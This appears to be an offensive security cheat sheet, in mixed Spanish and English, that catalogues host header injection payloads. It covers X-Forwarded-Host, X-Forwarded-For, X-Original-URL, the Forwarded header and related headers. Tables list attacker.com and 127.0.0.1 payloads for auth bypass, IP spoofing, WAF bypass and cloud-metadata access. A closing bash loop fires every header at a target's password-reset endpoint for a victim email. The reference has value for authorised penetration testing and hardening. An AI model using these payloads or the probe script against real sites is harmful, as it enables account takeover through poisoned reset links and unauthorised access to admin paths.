---
aliases:
  - X-Forwarded-Host
  - X-Original-URL
  - Forwarded RFC 7239
  - X-HTTP-Host-Override
tags:
  - type/cheatsheet
  - vuln/host-header-injection
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Host Header Injection]]'
---
# Host Header Injection - Headers Alternativos

***

## `X-Forwarded-Host` (XFH)

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Standard XFH | `X-Forwarded-Host: attacker.com` | Most common alternative. |
| XFH con port | `X-Forwarded-Host: attacker.com:443` | Port included. |
| Multiple values | `X-Forwarded-Host: a.com, b.com` | Comma-separated. |
| XFH overrides Host | Backend trusts XFH > Host | Reverse proxy convention. |
| XFH stripped at frontend | Frontend (CDN) strips → backend sees raw Host | Per-deploy. |
| Combine con Host | Both headers different values | Confusion. |
| `X-Forwarded-Proto` paired | `X-Forwarded-Proto: https` para construct URL | Combined. |
| Trusted IP-only | XFH only honored from trusted IPs | Bypass via spoofing IP. |
| Per-path override | App reads XFH solo en certain paths | Edge. |
| Apache `mod_remoteip` | Apache uses XFH to set remote IP | Different impact. |
| nginx `real_ip_header` | nginx config reads specific header | Per-config. |
^hhi-altheader-xfh

___

## `X-Forwarded-For` (XFF) y `X-Real-IP`

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| XFF en Host context | `X-Forwarded-For: attacker.com` | Normalmente IP, pero apps laxas. |
| Spoof internal IP | `X-Forwarded-For: 127.0.0.1` | Internal trust bypass. |
| Cloud metadata IP | `X-Forwarded-For: 169.254.169.254` | If app fetches based on IP. |
| Multiple XFF | `X-Forwarded-For: real, attacker, internal` | Last/first wins varies. |
| XFF + IP allowlist | If allowlist reads XFF without verify | Auth bypass. |
| `X-Real-IP: 127.0.0.1` | Same vector | Common alternative. |
| `Client-IP` header | Same | Edge. |
| `True-Client-IP` header | Akamai-style | Same. |
| `Cluster-Client-IP` | Internal cluster header | Edge. |
| `X-Originating-IP` | Less common | Edge. |
| `Cf-Connecting-IP` | Cloudflare-specific | Bypass if not stripped. |
| `Fastly-Client-IP` | Fastly-specific | Same. |
| Combine HHI + IP | Both Host attacker + XFF localhost | Multi-vector. |
^hhi-altheader-xff

___

## `X-Forwarded-Server`

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Standard XFS | `X-Forwarded-Server: attacker.com` | Less common. |
| Apache mod_proxy | Adds XFS in chained proxies | Apache specific. |
| Disclosure header | Can leak internal server name | Recon. |
| Combine con XFH | Both headers | Confusion. |
| Frameworks recognition | Spring, Django specifics | Per-framework. |
| Tomcat AJP injection | Adjacent vector | Stack-specific. |
| Generic header rewrite | Backend may use as Host equivalent | Edge. |
^hhi-altheader-xfs

___

## `X-HTTP-Host-Override` / `X-Host`

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Custom override | `X-HTTP-Host-Override: attacker.com` | Direct override. |
| `X-Host: attacker.com` | Custom header | Frequent en custom apps. |
| `X-Forwarded-Server: attacker.com` | Variant | Same. |
| `Forwarded: host=attacker.com` | RFC 7239 standard | Modern syntax. |
| Multi-value Forwarded | `Forwarded: host=a;proto=https, host=b` | Multiple proxies en chain. |
| Apache convenience | Some Apache configs use X-Host | Per-config. |
| nginx | Can use any header | Configurable. |
| Frameworks autoresolution | Spring `useForwardHeaders=true` | Stack-aware. |
| Custom headers list | App-specific (X-Forwarded-Whatever) | Recon. |
^hhi-altheader-host-override

___

## `X-Original-URL` / `X-Rewrite-URL`

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | IIS-specific headers que override path/URL | IIS-only typical. |
| Path override | `X-Original-URL: /admin` | Backend processes admin path while client sees /. |
| Bypass auth on /admin | If front blocks /admin URL but back uses X-Original-URL | Standard auth bypass. |
| `X-Rewrite-URL: /admin` | Same effect | Variant. |
| Combine con HHI | Atacante's Host + X-Original-URL | Multi-vector. |
| `X-Forwarded-URL` | Less common | Edge. |
| `X-Custom-IP-Authorization` | Bypass IP-based auth en specific apps | Atlassian/Confluence (CVE). |
| URL structure changes | Path en header vs URI line | Differential. |
| Method override pair | `X-HTTP-Method-Override: GET` + `X-Original-URL: /admin` | Method + path swap. |
| WAF bypass | Front WAF processes URI, back uses header | Standard. |
| Combine con Host | Different host + path override | Compound. |
^hhi-altheader-original

___

## `Forwarded:` (RFC 7239)

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Standard syntax | `Forwarded: by=<proxy>;for=<client>;host=<host>;proto=<scheme>` | RFC 7239. |
| Host injection | `Forwarded: host=attacker.com` | Direct. |
| For injection | `Forwarded: for=127.0.0.1` | IP spoof. |
| Proto injection | `Forwarded: proto=https` | Force scheme. |
| Multiple proxies | `Forwarded: for=a, for=b, for=c` | Chain syntax. |
| Quoted values | `Forwarded: host="attacker.com"` | Quotes optional. |
| Encoded values | `Forwarded: host=attacker%2Ecom` | Edge. |
| Combine con XFH | Multiple alternative headers | Confusion. |
| Modern frameworks | Spring 5.1+ supports Forwarded native | Stack-aware. |
| nginx config | Can extract Forwarded values | Per-config. |
| AWS ALB headers | ALB adds X-Forwarded-* — Forwarded less | Per-cloud. |
| Test if backend reads Forwarded | If yes → vector | Standard probe. |
^hhi-altheader-rfc7239

### Multi-header probe combo

```bash
# Test all alt headers para password reset
HEADERS=(
  'X-Forwarded-Host: attacker.com'
  'X-Forwarded-Server: attacker.com'
  'X-HTTP-Host-Override: attacker.com'
  'X-Host: attacker.com'
  'X-Forwarded-For: 127.0.0.1'
  'Forwarded: host=attacker.com'
  'X-Original-URL: /admin'
  'X-Rewrite-URL: /admin'
)

for h in "${HEADERS[@]}"; do
  echo "=== $h ==="
  R=$(curl -s -X POST -H "Host: target.com" -H "$h" \
       -d 'email=victim@target.com' \
       https://target.com/forgot)
  echo "$R" | head -c 200
done
```

***
